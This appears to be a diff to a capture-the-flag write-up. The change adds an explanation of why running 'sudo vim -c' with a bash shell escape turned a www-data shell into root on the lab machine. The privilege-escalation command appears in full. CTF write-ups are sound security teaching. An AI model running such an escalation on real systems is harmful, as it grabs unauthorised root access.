@@ -165,7 +165,9 @@ Abusing vim:
 www-data@friendly:/var/www$ sudo vim -c ':!/bin/bash'
 root@friendly:/var/www# 
 ```
-Then, I read `user.txt` and was about to read `root.txt` but
+Why it worked:   
+`-c` in vim is used for executing commands, and since we have root privileges on vim, we can basically own root!!   
+After that, I read `user.txt` and was about to read `root.txt` but
 ```
 root@friendly:~# cat root.txt 
 Not yet! Find root.txt.
